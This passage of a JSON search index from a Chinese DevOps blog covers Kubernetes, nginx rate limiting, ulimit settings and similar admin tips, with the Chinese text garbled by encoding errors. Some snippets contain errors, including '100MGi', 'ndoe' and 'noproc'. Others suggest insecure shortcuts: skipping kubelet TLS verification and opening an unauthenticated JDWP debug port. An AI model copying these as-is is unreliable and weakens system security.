serviceName: nginx servicePort: nginx-http - host: test.soulchild.cn http: paths: - backend: serviceName: nginx2 servicePort: nginx-http - http: paths: - backend: serviceName: df servicePort: df-http ","date":"2020-04-21 19:07","objectID":"/post/1583/:0:0","tags":["k8s"],"title":"k8sä¸­ingress-nginxçš„ä½¿ç”¨","uri":"/post/1583/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"ä¸´æ—¶ä¿®æ”¹ å‘½ä»¤ï¼š ulimit[-aHS][-c\u003ccoreæ–‡ä»¶ä¸Šé™\u003e][-d\u003cæ•°æ®èŠ‚åŒºå¤§å°\u003e][-f\u003cæ–‡ä»¶å¤§å°\u003e][-m\u003cå†…å­˜å¤§å°\u003e][-n\u003cæ–‡ä»¶æ•°ç›®\u003e][-p\u003cç¼“å†²åŒºå¤§å°\u003e][-s\u003cå †å å¤§å°\u003e][-t\u003cCPUæ—¶é—´\u003e][-u\u003cç¨‹åºæ•°ç›®\u003e][-v\u003cè™šæ‹Ÿå†…å­˜å¤§å°\u003e] å‚æ•°ï¼š -a æ˜¾ç¤ºç›®å‰èµ„æºé™åˆ¶çš„è®¾å®šã€‚ -c coreæ–‡ä»¶ä¸Šé™ è®¾å®šcoreæ–‡ä»¶çš„æœ€å¤§å€¼ï¼Œå•ä½ä¸ºåŒºå—ã€‚ -d æ•°æ®èŠ‚åŒºå¤§å° ç¨‹åºæ•°æ®èŠ‚åŒºçš„æœ€å¤§å€¼ï¼Œå•ä½ä¸ºKBã€‚ -f æ–‡ä»¶å¤§å° shellæ‰€èƒ½å»ºç«‹çš„æœ€å¤§æ–‡ä»¶ï¼Œå•ä½ä¸ºåŒºå—ã€‚ -H è®¾å®šèµ„æºçš„ç¡¬æ€§é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯ç®¡ç†å‘˜æ‰€è®¾ä¸‹çš„é™åˆ¶ã€‚ä¸¥æ ¼çš„è®¾å®šï¼Œå¿…å®šä¸èƒ½è¶…è¿‡è¿™ä¸ªè®¾å®šçš„æ•°å€¼ -m å†…å­˜å¤§å° æŒ‡å®šå¯ä½¿ç”¨å†…å­˜çš„ä¸Šé™ï¼Œå•ä½ä¸ºKBã€‚ -n æ–‡ä»¶æ•°ç›® æŒ‡å®šåŒä¸€æ—¶é—´æœ€å¤šå¯å¼€å¯çš„æ–‡ä»¶æ•°ã€‚ -p ç¼“å†²åŒºå¤§å° æŒ‡å®šç®¡é“ç¼“å†²åŒºçš„å¤§å°ï¼Œå•ä½512å­—èŠ‚ã€‚ -s å †å å¤§å° æŒ‡å®šå †å çš„ä¸Šé™ï¼Œå•ä½ä¸ºKBã€‚ -S è®¾å®šèµ„æºçš„è½¯é™åˆ¶ã€‚è­¦å‘Šçš„è®¾å®šï¼Œå¯ä»¥è¶…è¿‡è¿™ä¸ªè®¾å®šå€¼ï¼Œä½†æ˜¯è‹¥è¶…è¿‡åˆ™æœ‰è­¦å‘Šä¿¡æ¯ -t CPUæ—¶é—´ æŒ‡å®šCPUä½¿ç”¨æ—¶é—´çš„ä¸Šé™ï¼Œå•ä½ä¸ºç§’ã€‚ -u ç¨‹åºæ•°ç›® ç”¨æˆ·æœ€å¤šå¯å¼€å¯çš„ç¨‹åºæ•°ç›®ã€‚ -v è™šæ‹Ÿå†…å­˜å¤§å° æŒ‡å®šå¯ä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜ä¸Šé™ï¼Œå•ä½ä¸ºKBã€‚ # æ˜¾ç¤ºç³»ç»Ÿèµ„æºçš„è®¾ç½® ulimit -a # è®¾ç½®æœ€å¤§æ–‡ä»¶æ‰“å¼€æ•° ulimit -n 10240 # è®¾ç½®å•ä¸€ç”¨æˆ·ç¨‹åºä¸Šé™ ulimit -u 65535 ","date":"2020-04-13 15:30","objectID":"/post/1580/:1:0","tags":[],"title":"ä¿®æ”¹limité…ç½®é™åˆ¶linuxæœ€å¤§æ–‡ä»¶æè¿°ç¬¦å’Œæœ€å¤§è¿›ç¨‹æ•°","uri":"/post/1580/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"æ°¸ä¹…ä¿®æ”¹-ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š vim /etc/security/limits.conf * soft noproc 65535 * hard noproc 65535 * soft nofile 65535 * hard nofile 65535 * soft memlock unlimited * hard memlock unlimited xx - nofile 65535 centos7è¿˜éœ€è¦ä¿®æ”¹ vim /etc/security/limits.d/20-nproc.conf * soft nproc 4096 root soft nproc unlimited è¯´æ˜ï¼š * ä»£è¡¨é’ˆå¯¹æ‰€æœ‰ç”¨æˆ· soft ä»£è¡¨è½¯é™åˆ¶ï¼š-S ï¼šsoft limit ï¼Œè­¦å‘Šçš„è®¾å®šï¼Œå¯ä»¥è¶…è¿‡è¿™ä¸ªè®¾å®šå€¼ï¼Œä½†æ˜¯è‹¥è¶…è¿‡åˆ™æœ‰è­¦å‘Šä¿¡æ¯ hard ä»£è¡¨ç¡¬é™åˆ¶ï¼š-H ï¼šhard limit ï¼Œä¸¥æ ¼çš„è®¾å®šï¼Œå¿…å®šä¸èƒ½è¶…è¿‡è¿™ä¸ªè®¾å®šçš„æ•°å€¼ - ä»£è¡¨è½¯ç¡¬åŒæ—¶è®¾ç½® noproc æ˜¯ä»£è¡¨æœ€å¤§è¿›ç¨‹æ•° nofile æ˜¯ä»£è¡¨æœ€å¤§æ–‡ä»¶æ‰“å¼€æ•° memlock ä»£è¡¨å¯ä»¥é”å®šå…¶åœ°å€ç©ºé—´çš„å†…å­˜é‡ unlimited æ— é™åˆ¶ ","date":"2020-04-13 15:30","objectID":"/post/1580/:2:0","tags":[],"title":"ä¿®æ”¹limité…ç½®é™åˆ¶linuxæœ€å¤§æ–‡ä»¶æè¿°ç¬¦å’Œæœ€å¤§è¿›ç¨‹æ•°","uri":"/post/1580/"},{"categories":["kubernetes"],"content":"é›†ç¾¤ç‰ˆæœ¬ï¼š 1.ä¸‹è½½metrics-server ç›´æ¥ä¸‹è½½yamlæ–‡ä»¶ï¼š wget https://github.com/kubernetes-sigs/metrics-server/releases/download/v0.3.6/components.yaml æˆ–è€…ä¸‹è½½æºä»£ç è¿›å…¥åˆ°deployç›®å½• metrics-server-xxx/deploy/ 2.ä¿®æ”¹é•œåƒåœ°å€ sed -i 's#k8s.gcr.io#registry.aliyuncs.com/google_containers#' components.yaml 3.å®‰è£… kubectl apply -f components.yaml æŠ¥é”™1ï¼š é»˜è®¤é€šè¿‡dnsè§£æä¸»æœºåï¼Œè§£æå¤±è´¥ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹corednsé…ç½®è§£å†³ æˆ–è€…ä¿®æ”¹å¯åŠ¨å‚æ•°ï¼Œæ‰‹åŠ¨æŒ‡å®šipç±»å‹ â€“kubelet-preferred-address-types=InternalIP å®‰è£…ï¼š kubectl apply -f components.yaml æŠ¥é”™2ï¼š è¯ä¹¦é—®é¢˜ï¼Œæ·»åŠ è·³è¿‡è®¤è¯çš„å‚æ•°â€“kubelet-insecure-tls 4.éªŒè¯ kubectl top ndoe 5.é…ç½®deplotment apiVersion: extensions/v1beta1 kind: Deployment metadata: name: hpa-test labels: app: hpa spec: template: metadata: labels: app: nginx spec: containers: - name: nginx-c image: nginx:1.14.2 ports: - containerPort: 80 resources: requests: cpu: 0.005 memory: 100Mi limits: cpu: 0.010 memory: 100MGi 6.åˆ›å»ºhpaèµ„æº kubectl autoscale --max=10 --min=1 --cpu-percent=5 deployment hpa-test 7.å‹æµ‹ å¼€å§‹æµ‹è¯•ï¼š while true;do curl -I 10.244.1.90;done å¯ä»¥çœ‹åˆ°é…ç½®å·²ç»ç”Ÿæ•ˆ ","date":"2020-04-08 12:03","objectID":"/post/1567/:0:0","tags":["k8s"],"title":"k8sä½¿ç”¨metrics-serverå®ç°hpaå¼¹æ€§ä¼¸ç¼©","uri":"/post/1567/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸‰ç§å®ç°æ–¹å¼ï¼š limit_conn_zone limit_req_zone ngx_http_upstream_module ","date":"2020-04-02 14:47","objectID":"/post/1546/:1:0","tags":["nginx"],"title":"nginxé…ç½®é™æµ","uri":"/post/1546/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®‰è£…å‹æµ‹å·¥å…· yum install -y httpd-tools # 10ä¸ªè¿æ¥å‘é€1000ä¸ªè¯·æ±‚ ab -c 10 -n 1000 http://192.168.2.200/ ","date":"2020-04-02 14:47","objectID":"/post/1546/:2:0","tags":["nginx"],"title":"nginxé…ç½®é™æµ","uri":"/post/1546/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"é…ç½®nginxé™æµ ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:0","tags":["nginx"],"title":"nginxé…ç½®é™æµ","uri":"/post/1546/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ç¬¬ä¸€ç§ï¼šlimit_conn_zoneé™åˆ¶è¿æ¥æ•°ï¼Œç‰¹åˆ«æ˜¯æ¥è‡ªå•ä¸ªIPåœ°å€çš„è¿æ¥æ•°ã€‚ å¹¶éæ‰€æœ‰è¿æ¥éƒ½ä¼šè¢«è®¡æ•°ã€‚ä»…åŒ…å«æœåŠ¡å™¨æ­£åœ¨å¤„ç†çš„è¯·æ±‚å¹¶ä¸”å·²è¯»å–æ•´ä¸ªè¯·æ±‚å¤´æ—¶ï¼Œæ‰å¯¹è¿æ¥è¿›è¡Œè®¡æ•°ã€‚ ** åœ¨httpå­—æ®µä¸­æ·»åŠ ï¼š** limit_conn_zone $binary_remote_addr zone=addr:10m; å«ä¹‰ï¼š $binary_remote_addr: ä½¿ç”¨è¿™ä¸ªæ ‡è¯†æ¥ç¡®è®¤ç”¨æˆ·èº«ä»½å”¯ä¸€æ€§,$binary_remote_addrå˜é‡çš„å¤§å°å¯¹äºIPv4åœ°å€å§‹ç»ˆä¸º4å­—èŠ‚ï¼Œå¯¹äºIPv6åœ°å€å§‹ç»ˆä¸º16å­—èŠ‚ã€‚å­˜å‚¨çŠ¶æ€åœ¨64ä½å¹³å°ä¸Šæ€»æ˜¯å ç”¨64å­—èŠ‚ã€‚ä¸€ä¸ª1å…†å­—èŠ‚çš„åŒºåŸŸå¯ä»¥ä¿ç•™å¤§çº¦1.6ä¸‡ä¸ª64å­—èŠ‚çŠ¶æ€ã€‚å¦‚æœåŒºåŸŸå­˜å‚¨å·²ç”¨å°½ï¼ŒæœåŠ¡å™¨å°†æŠŠé”™è¯¯è¿”å›ç»™æ‰€æœ‰è¯·æ±‚ã€‚ zone: æŒ‡å®šä¸€ä¸ªå…±äº«å†…å­˜åŒºåŸŸåç§°ä¸ºaddrï¼Œå¤§å°ä¸º10mã€‚å½“è¶…è¿‡æ­¤é™åˆ¶æ—¶ï¼ŒæœåŠ¡å™¨å°†è¿”å›é”™è¯¯ ** åœ¨serverå­—æ®µæ·»åŠ ï¼š** limit_conn addr 1; å«ä¹‰ï¼šæ¯ä¸ªipåªå…è®¸1ä¸ªè¿æ¥,ä½¿ç”¨çš„æ˜¯addrå…±äº«åŒºåŸŸ ** æµ‹è¯•ï¼š** ab -c 1 -n 10 http://192.168.2.200/ä¸€ä¸ªè¿æ¥å‘é€10ä¸ªè¯·æ±‚ è®¿é—®æ­£å¸¸ ab -c 2 -n 10 http://192.168.2.200/ 2ä¸ªè¿æ¥å‘é€10ä¸ªè¯·æ±‚ å…¶ä¸­æœ‰1ä¸ªè®¿é—®æ˜¯å¤±è´¥çš„ ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:1","tags":["nginx"],"title":"nginxé…ç½®é™æµ","uri":"/post/1546/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ç¬¬äºŒç§ï¼šlimit_req_zoneï¼Œç”¨äºé™åˆ¶å•ä¸€çš„IPåœ°å€çš„è¯·æ±‚çš„å¤„ç†é€Ÿç‡ã€‚ åœ¨httpå­—æ®µä¸­æ·»åŠ ï¼š limit_req_zoneÂ $binary_remote_addrÂ zone=addr_req:10mÂ rate=1r/s; å«ä¹‰ï¼š $binary_remote_addr ï¼šåŒä¸Š zone: æŒ‡å®šä¸€ä¸ªå…±äº«å†…å­˜åŒºåŸŸåç§°ï¼Œå¤§å°ä¸º10mã€‚å½“è¶…è¿‡æ­¤é™åˆ¶æ—¶ï¼ŒæœåŠ¡å™¨å°†è¿”å›é”™è¯¯ rate: ä»£è¡¨æ¯ç§’å¤„ç†1ä¸ªè¯·æ±‚ åœ¨serverå­—æ®µæ·»åŠ ï¼š limit_req zone=addr_req burst=5; å«ä¹‰ï¼š zone:ä½¿ç”¨çš„æ˜¯addr_reqå…±äº«åŒºåŸŸ burst=5:ä»£è¡¨è¶…å‡ºé¢‘ç‡çš„è®¿é—®è¯·æ±‚ä¼šæ”¾åˆ°ç¼“å†²åŒºï¼Œæœ€å¤šæ”¾5ä¸ªï¼Œè¶…è¿‡è¿™5ä¸ªçš„è¯·æ±‚ä¼šç›´æ¥æŠ¥503çš„é”™è¯¯ã€‚ æµ‹è¯•ï¼š ab -c 10 -n 10 http://192.168.2.210/ 10ä¸ªè¿æ¥å‘é€10ä¸ªè¯·æ±‚ï¼Œæˆ‘ä»¬é™åˆ¶çš„æ˜¯æ¯ç§’1ä¸ªè¯·æ±‚ï¼Œç¬¬ä¸€ä¸ªè¯·æ±‚ä¼šè¢«å¤„ç†ï¼Œåé¢çš„è¯·æ±‚ä¼šæ”¾åˆ°ç¼“å†²åŒºï¼Œè¶…è¿‡5ä¸ªä¼šè¿”å›é”™è¯¯ã€‚æ‰€ä»¥ä¼šæœ‰6ä¸ªè¯·æ±‚æ˜¯æˆåŠŸçš„ã€‚ ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:2","tags":["nginx"],"title":"nginxé…ç½®é™æµ","uri":"/post/1546/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ç¬¬ä¸‰ç§ï¼šngx_http_upstream_moduleæ¨¡å—çš„max_conns(åœ¨nginx 1.11.5ç‰ˆæœ¬ä»¥åå¯ç”¨) é™åˆ¶nginxåˆ°åç«¯æœåŠ¡å™¨çš„è¿æ¥æ•°ï¼Œé»˜è®¤ä¸º0ï¼Œæ— é™åˆ¶ã€‚ åœ¨upstreamä¸­æ¯ä¸ªä¸»æœºåé¢é…ç½® max_conns=2 æµ‹è¯•ï¼š ab -c 3 -n 10 http://192.168.2.210/ ","date":"2020-04-02 14:47","objectID":"/post/1546/:3:3","tags":["nginx"],"title":"nginxé…ç½®é™æµ","uri":"/post/1546/"},{"categories":["å…¶ä»–"],"content":"å¯åŠ¨æ—¶åŠ å…¥å‚æ•°ï¼š java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=30001 -jar xxx.jar ä½¿ç”¨IDEAè°ƒè¯•å‚è€ƒï¼š https://blog.csdn.net/mimica247706624/article/details/80991656 ","date":"2020-03-16 17:09","objectID":"/post/1527/:0:0","tags":["java"],"title":"javaç¨‹åºå¼€å¯è¿œç¨‹debug","uri":"/post/1527/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" export PS1=\"\\[\\e[37m\\][\\[\\e[32m\\]\\u\\[\\e[37m\\]@MBP \\[\\e[36m\\]\\W\\[\\e[0m\\]]\\\\$ \" è¯´æ˜ï¼š å­—ä½“é¢œè‰² å­—ä½“èƒŒæ™¯é¢œè‰² 30ï¼šé»‘ 31ï¼šçº¢ 32ï¼šç»¿ 33ï¼šé»„ 34ï¼šè“è‰² 35ï¼šç´«è‰² 36ï¼šæ·±ç»¿ 37ï¼šç™½è‰² å­—ä½“èƒŒæ™¯é¢œè‰² 40ï¼šé»‘ 41ï¼šæ·±çº¢ 42ï¼šç»¿ 43ï¼šé»„è‰² 44ï¼šè“è‰² 45ï¼šç´«è‰² 46ï¼šæ·±ç»¿ 47ï¼šç™½è‰² æ˜¾ç¤ºæ–¹å¼ 0ï¼šç»ˆç«¯é»˜è®¤è®¾ç½® 1ï¼šé«˜äº®æ˜¾ç¤º 4ï¼šä¸‹åˆ’çº¿ 5ï¼šé—ªçƒ 7ï¼šåç™½æ˜¾ç¤º 8ï¼šéšè— æ ¼å¼ï¼š \\033[1;31;40m # 1 æ˜¯æ˜¾ç¤ºæ–¹å¼ï¼Œå¯é€‰ã€‚31 æ˜¯å­—ä½“é¢œè‰²ã€‚40m æ˜¯å­—ä½“èƒŒæ™¯é¢œè‰²ã€‚\\033å¯ä»¥ç”¨\\eä»£æ›¿ \\033[0m # æ¢å¤ç»ˆç«¯é»˜è®¤é¢œè‰²ï¼Œå³å–æ¶ˆé¢œè‰²è®¾ç½®ã€‚ ","date":"2020-03-13 11:18","objectID":"/post/1523/:0:0","tags":[],"title":"shellé¢œè‰²","uri":"/post/1523/"},{"categories":["kubernetes"],"content":"initå®¹å™¨åˆå§‹åŒ–ä¸æˆåŠŸï¼Œä¸»å®¹å™¨ä¸ä¼šæ‰§è¡Œ 1.ä¸¾ä¾‹ åˆ›å»ºpod apiVersion: v1 kind: Pod metadata: name: blog labels: app: blog spec: initContainers: - name: init-conf image: busybox command: - wget - -O - /work-dir/index.html - \"https://soulchild.cn\" volumeMounts: - name: work-dir mountPath: /work-dir/ containers: - name: blog image: nginx ports: - containerPort: 80 volumeMounts: - name: work-dir mountPath: /usr/share/nginx/html/ volumes: - name: work-dir emptyDir: {} åˆ›å»ºsvc apiVersion: v1 kind: Service metadata: name: blog spec: selector: app: blog type: NodePort ports: - nodePort: 30002 port: 80 targetPort: 80 åˆ›å»ºåå¯ä»¥è®¿é—®masteræˆ–nodeçš„IP+30002 ","date":"2020-03-10 16:17","objectID":"/post/1519/:0:0","tags":["k8s"],"title":"k8sä¹‹initå®¹å™¨","uri":"/post/1519/"},{"categories":["kubernetes"],"content":"ç®€å•è®°å½• åŸæ–‡åœ°å€ï¼šhttps://www.kubernetes.org.cn/2362.html å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ï¼šhttps://v1-14.docs.kubernetes.io/zh/docs/concepts/workloads/pods/pod-lifecycle/ ä½œç”¨ï¼š livenessï¼š Kubeletä½¿ç”¨liveness probeï¼ˆå­˜æ´»æ¢é’ˆï¼‰æ¥ç¡®å®šä½•æ—¶é‡å¯å®¹å™¨ã€‚ä¾‹å¦‚ï¼Œå½“åº”ç”¨ç¨‹åºå¤„äºè¿è¡ŒçŠ¶æ€ä½†æ— æ³•åšè¿›ä¸€æ­¥æ“ä½œï¼Œlivenessæ¢é’ˆå°†æ•è·åˆ°deadlockï¼Œé‡å¯å¤„äºè¯¥çŠ¶æ€ä¸‹çš„å®¹å™¨ï¼Œä½¿åº”ç”¨ç¨‹åºåœ¨å­˜åœ¨bugçš„æƒ…å†µä¸‹ä¾ç„¶èƒ½å¤Ÿç»§ç»­è¿è¡Œä¸‹å»ï¼ˆè°çš„ç¨‹åºè¿˜æ²¡å‡ ä¸ªbugå‘¢ï¼‰ã€‚ï¼ˆæ˜¯å¦é‡å¯å–å†³äºé‡å¯ç­–ç•¥ï¼‰ readinessï¼š Kubeletä½¿ç”¨readiness probeï¼ˆå°±ç»ªæ¢é’ˆï¼‰æ¥ç¡®å®šå®¹å™¨æ˜¯å¦å·²ç»å°±ç»ªå¯ä»¥æ¥å—æµé‡ã€‚åªæœ‰å½“Podä¸­çš„å®¹å™¨éƒ½å¤„äºå°±ç»ªçŠ¶æ€æ—¶kubeletæ‰ä¼šè®¤å®šè¯¥Podå¤„äºå°±ç»ªçŠ¶æ€ã€‚è¯¥ä¿¡å·çš„ä½œç”¨æ˜¯æ§åˆ¶å“ªäº›Podåº”è¯¥ä½œä¸ºserviceçš„åç«¯ã€‚å¦‚æœPodå¤„äºéå°±ç»ªçŠ¶æ€ï¼Œé‚£ä¹ˆå®ƒä»¬å°†ä¼šè¢«ä»serviceçš„load balancerä¸­ç§»é™¤ã€‚(ä¸ä¼šæ”¹å˜å®¹å™¨è¿è¡ŒçŠ¶æ€ï¼Œæ£€æµ‹å¤±è´¥ï¼Œpodçš„READè¾¾ä¸åˆ°é¢„æœŸçš„æ•ˆæœ) readinesså’Œlivenessä¸€èˆ¬é…åˆä½¿ç”¨ï¼Œlivenessè´Ÿè´£å¥åº·çŠ¶æ€æ£€æŸ¥ï¼Œé‡å¯å®¹å™¨ã€‚readinessè´Ÿè´£å°†podä»svcä¸­ç§»é™¤ï¼Œæ§åˆ¶æµé‡ã€‚ å¤šä¸ªlivenessæ—¶ï¼Œåªä¼šå½±å“å¯¹åº”çš„containerã€‚ å®šä¹‰liveness execï¼š apiVersion: v1 kind: Pod metadata: name: liveness-exec labels: app: liveness spec: containers: - name: liveness image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -f /tmp/healthy; sleep 600 livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 3 periodSeconds: 3 periodSecondsÂ è§„å®škubeletè¦æ¯éš”3ç§’æ‰§è¡Œä¸€æ¬¡liveness probeã€‚ initialDelaySecondsÂ å‘Šè¯‰kubeletåœ¨ç¬¬ä¸€æ¬¡æ‰§è¡Œprobeä¹‹å‰è¦çš„ç­‰å¾…3ç§’é’Ÿã€‚æ¢é’ˆæ£€æµ‹å‘½ä»¤æ˜¯åœ¨å®¹å™¨ä¸­æ‰§è¡ŒÂ cat /tmp/healthyÂ å‘½ä»¤ã€‚å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œå°†è¿”å›0ï¼Œkubeletå°±ä¼šè®¤ä¸ºè¯¥å®¹å™¨æ˜¯æ´»ç€çš„å¹¶ä¸”å¾ˆå¥åº·ã€‚å¦‚æœè¿”å›é0å€¼ï¼Œkubeletå°±ä¼šæ€æ‰è¿™ä¸ªå®¹å™¨å¹¶é‡å¯å®ƒã€‚ httpï¼š apiVersion: v1 kind: Pod metadata: name: liveness-http labels: app: liveness-http spec: containers: - name: liveness-http image: cnych/liveness args: - /server livenessProbe: httpGet: port: 8080 path: /healthz initialDelaySeconds: 3 periodSeconds: 3 periodSeconds æŒ‡å®škubeleteéœ€è¦æ¯éš”3ç§’æ‰§è¡Œä¸€æ¬¡liveness probeã€‚ initialDelaySecondsÂ æŒ‡å®škubeletåœ¨è¯¥æ‰§è¡Œç¬¬ä¸€æ¬¡æ¢æµ‹ä¹‹å‰éœ€è¦ç­‰å¾…3ç§’é’Ÿã€‚è¯¥æ¢é’ˆå°†å‘å®¹å™¨ä¸­çš„serverçš„8080ç«¯å£å‘é€ä¸€ä¸ªHTTP GETè¯·æ±‚ã€‚å¦‚æœserverçš„/healthzè·¯å¾„çš„handlerè¿”å›ä¸€ä¸ªæˆåŠŸçš„è¿”å›ç ï¼Œkubeletå°±ä¼šè®¤å®šè¯¥å®¹å™¨æ˜¯æ´»ç€çš„å¹¶ä¸”å¾ˆå¥åº·ã€‚å¦‚æœè¿”å›å¤±è´¥çš„è¿”å›ç ï¼Œkubeletå°†æ€æ‰è¯¥å®¹å™¨å¹¶é‡å¯å®ƒã€‚ ä»»ä½•å¤§äº200å°äº400çš„è¿”å›ç éƒ½ä¼šè®¤å®šæ˜¯æˆåŠŸçš„è¿”å›ç ã€‚å…¶ä»–è¿”å›ç éƒ½ä¼šè¢«è®¤ä¸ºæ˜¯å¤±è´¥çš„è¿”å›ç ã€‚ tcpSocketï¼š å¤§åŒå°å¼‚ å®šä¹‰readiness æœ‰æ—¶ï¼Œåº”ç”¨ç¨‹åºæš‚æ—¶æ— æ³•å¯¹å¤–éƒ¨æµé‡æä¾›æœåŠ¡ã€‚ ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦åœ¨å¯åŠ¨æœŸé—´åŠ è½½å¤§é‡æ•°æ®æˆ–é…ç½®æ–‡ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ ä¸æƒ³æ€æ­»åº”ç”¨ç¨‹åºï¼Œä½†ä½ ä¹Ÿä¸æƒ³å‘é€è¯·æ±‚ã€‚ Kubernetesæä¾›äº†readiness probeæ¥æ£€æµ‹å’Œå‡è½»è¿™äº›æƒ…å†µã€‚ Podä¸­çš„å®¹å™¨å¯ä»¥æŠ¥å‘Šè‡ªå·±è¿˜æ²¡æœ‰å‡†å¤‡ï¼Œä¸èƒ½å¤„ç†KubernetesæœåŠ¡å‘é€è¿‡æ¥çš„æµé‡ã€‚ readiness apiVersion: v1 kind: Pod metadata: name: readiness labels: app: readiness spec: containers: - name: readiness image: cnych/liveness args: - /server readinessProbe: httpGet: port: 8080 path: /healthz initialDelaySeconds: 3 periodSeconds: 3 ","date":"2020-03-10 12:17","objectID":"/post/1512/:0:0","tags":["k8s"],"title":"k8sä¹‹Podçš„livenesså’Œreadinessæ¢é’ˆ","uri":"/post/1512/"},{"categories":["kubernetes"],"content":"1.postStart è¿™ä¸ªé’©å­åœ¨åˆ›å»ºå®¹å™¨ä¹‹åç«‹å³æ‰§è¡Œã€‚Â ä½†æ˜¯ï¼Œå¹¶ä¸èƒ½ä¿è¯é’©å­åœ¨å®¹å™¨æœ¬èº«çš„åˆå§‹å‘½ä»¤(ENTRYPOINT)ä¹‹å‰è¿è¡Œã€‚ ä¸»è¦ç”¨äºèµ„æºéƒ¨ç½²ã€ç¯å¢ƒå‡†å¤‡ç­‰ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœé’©å­èŠ±è´¹æ—¶é—´è¿‡é•¿ä»¥åŠäºä¸èƒ½è¿è¡Œæˆ–è€…æŒ‚èµ·ï¼Œå®¹å™¨å°†ä¸èƒ½è¾¾åˆ°RunningçŠ¶æ€ã€‚ yamlä¸¾ä¾‹: apiVersion: v1 kind: Pod metadata: name: start-hook labels: app: test spec: containers: - name: start-hook image: nginx ports: - name: nginx-port containerPort: 80 lifecycle: postStart: exec: command: [\"/bin/bash\", \"-c\", \"echo before running \u0026gt; /postStart.txt\"] ","date":"2020-03-09 20:04","objectID":"/post/1507/:0:1","tags":["k8s"],"title":"k8sä½¿ç”¨pod hooké’©å­å‡½æ•°","uri":"/post/1507/"},{"categories":["kubernetes"],"content":"2.PreStop åœ¨å®¹å™¨ç»ˆæ­¢ä¹‹å‰ç«‹å³è°ƒç”¨æ­¤é’©å­ã€‚ å®ƒæ˜¯é˜»å¡çš„ï¼Œæ‰€ä»¥åªæœ‰æ­¤é’©å­æ‰§è¡Œå®Œåï¼Œæ‰ä¼šæ‰§è¡Œåˆ é™¤å®¹å™¨çš„æ“ä½œ ä¸»è¦ç”¨äºä¼˜é›…å…³é—­åº”ç”¨ç¨‹åºã€é€šçŸ¥å…¶ä»–ç³»ç»Ÿç­‰ã€‚å¦‚æœé’©å­åœ¨æ‰§è¡ŒæœŸé—´æŒ‚èµ·ï¼ŒPodé˜¶æ®µå°†åœç•™åœ¨RunningçŠ¶æ€å¹¶ä¸”ä¸ä¼šè¾¾åˆ°failedçŠ¶æ€ apiVersion: v1 kind: Pod metadata: name: stop-hook labels: app: test spec: containers: - name: stop-hook image: nginx ports: - name: nginx-port containerPort: 80 lifecycle: preStop: exec: command: [\"/usr/sbin/nginx\", \"-s\", \"quit\"] ä¼˜é›…é€€å‡ºï¼š å½“podè¢«åˆ é™¤æ—¶ï¼Œä¼šå¤„äºTerminatingçŠ¶æ€ï¼ŒåŒæ—¶ä¼šå°†ä»–ä»epä¸­æ‘˜é™¤ï¼Œkube-proxyæ›´æ–°ipvsè§„åˆ™æ‘˜é™¤æµé‡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªpodå°±ä¸ä¼šå†æœ‰æ–°çš„è¯·æ±‚è¿›æ¥äº†ã€‚é‚£ä¹ˆå¦‚æœpreStopä½¿ç”¨äº†sleep 30ï¼Œä¼šç­‰å¾…30ç§’åçœŸæ­£åˆ é™¤podï¼Œè¿™30ç§’å¯ä»¥ç”¨æ¥å¤„ç†æ²¡æœ‰å¤„ç†å®Œçš„è¯·æ±‚ ","date":"2020-03-09 20:04","objectID":"/post/1507/:0:2","tags":["k8s"],"title":"k8sä½¿ç”¨pod hooké’©å­å‡½æ•°","uri":"/post/1507/"},{"categories":["kubernetes"],"content":"1.ç”Ÿæˆtoken kubeadm token create --print-join-command 2.åŠ å…¥é›†ç¾¤ kubeadm join 192.168.0.10:6443 --token xxxxxxx --discovery-token-ca-cert-hash sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx å…¶ä»–å‘½ä»¤ æŸ¥çœ‹tokenåˆ—è¡¨ kubeadm token list è·å–caè¯ä¹¦çš„sha256 hashå€¼ openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2\u003e/dev/null | openssl dgst -sha256 -hex | sed 's/^.* //' ","date":"2020-03-09 14:57","objectID":"/post/1503/:0:0","tags":["k8s"],"title":"k8så¢åŠ nodeèŠ‚ç‚¹","uri":"/post/1503/"},{"categories":["å…¶ä»–"],"content":"æ‰“å¼€é…ç½®æ–‡ä»¶ sudo vi /Library/Preferences/VMware\\ Fusion/vmnet8/nat.conf æ‰¾åˆ°å¦‚ä¸‹é…ç½® [incomingtcp] Use these with care - anyone can enter into your VM through theseâ€¦ The format and example are as follows: #\u003cexternal port number\u003e = \u003cVMâ€™s IP address\u003e:\u003cVMâ€™s port number\u003e 23 = 172.16.161.129:22 #å°†IP172.16.161.129è™šæ‹Ÿæœºçš„22 ç«¯å£æ˜ å°„åˆ°ä¸»æœº23ç«¯å£ é‡å¯VMçš„ç½‘ç»œæœåŠ¡ sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-cli â€“stop sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-cli â€“start ","date":"2020-03-09 